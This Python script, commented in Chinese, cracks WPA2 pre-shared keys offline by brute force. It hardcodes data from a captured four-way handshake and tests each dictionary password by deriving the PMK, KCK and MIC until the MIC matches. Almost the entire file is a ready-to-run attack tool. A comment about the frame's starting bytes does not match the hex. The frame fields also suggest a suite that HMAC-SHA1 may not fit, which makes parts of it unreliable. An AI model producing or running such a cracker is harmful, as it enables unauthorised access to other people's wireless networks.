import hashlib
import hmac
import sys

# ===== 1. 实验捕获的静态数据 (从你的新抓包提取) =====
SSID = "test123"
AP_MAC = bytes.fromhex("ca30308a11c8")
STA_MAC = bytes.fromhex("14857f1a37d1")
ANONCE = bytes.fromhex("3f8eb7ebe22be8273ba962adb95b72d35ede8153b983654d5dcb7d3ca00c2843")
SNONCE = bytes.fromhex("08c6d16e42d7063ae3e9ddcc53679692b6d69e01601920c96f8398244ac8adf0")

# 从 M2 提取的原始 MIC
TARGET_MIC = bytes.fromhex("53283c5832a855d700c60581eeb67f62")

# 提取并准备 EAPOL 帧（已裁剪掉以太网头，从 01030075 开始）
m2_hex = "0103007e0201080000000000000000000108c6d16e42d7063ae3e9ddcc53679692b6d69e01601920c96f8398244ac8adf0000000000000000000000000000000000000000000000000000000000000000053283c5832a855d700c60581eeb67f62001f301a0100000fac040100000fac040100000fac08fc000000000fac06f40120"
eapol_frame = bytearray(bytes.fromhex(m2_hex))
# 确保计算前 MIC 位是清零的
eapol_frame[81:97] = b'\x00' * 16

# 预准备 PRF 输入数据 (Min/Max 排序)
m1, m2 = (AP_MAC, STA_MAC) if AP_MAC < STA_MAC else (STA_MAC, AP_MAC)
n1, n2 = (ANONCE, SNONCE) if ANONCE < SNONCE else (SNONCE, ANONCE)
B_DATA = m1 + m2 + n1 + n2
PRF_MSG = b"Pairwise key expansion\x00" + B_DATA + b"\x00"

def try_crack(dict_path):
    print(f"[*] 正在加载字典: {dict_path}")
    print(f"[*] 目标 SSID: {SSID}")
    print("-" * 40)
    
    try:
        with open(dict_path, 'r') as f:
            for line in f:
                password = line.strip()
                if not password: continue
                
                # 核心计算：PMK -> KCK -> MIC
                pmk = hashlib.pbkdf2_hmac("sha1", password.encode(), SSID.encode(), 4096, 32)
                kck = hmac.new(pmk, PRF_MSG, hashlib.sha1).digest()[:16]
                calculated_mic = hmac.new(kck, eapol_frame, hashlib.sha1).digest()[:16]
                
                print(f"[正在尝试] 密码: {password.ljust(15)} -> MIC: {calculated_mic.hex()[:10]}...")
                
                if calculated_mic == TARGET_MIC:
                    print("-" * 40)
                    print(f"✅ 破解成功！匹配到正确密码: {password}")
                    print(f"最终确认 MIC: {calculated_mic.hex()}")
                    return
    except FileNotFoundError:
        print("❌ 错误：找不到密码本文件！")
    
    print("-" * 40)
    print("[-] 字典已耗尽，未能匹配到正确密码。")

if __name__ == "__main__":
    try_crack("passwordbook.txt")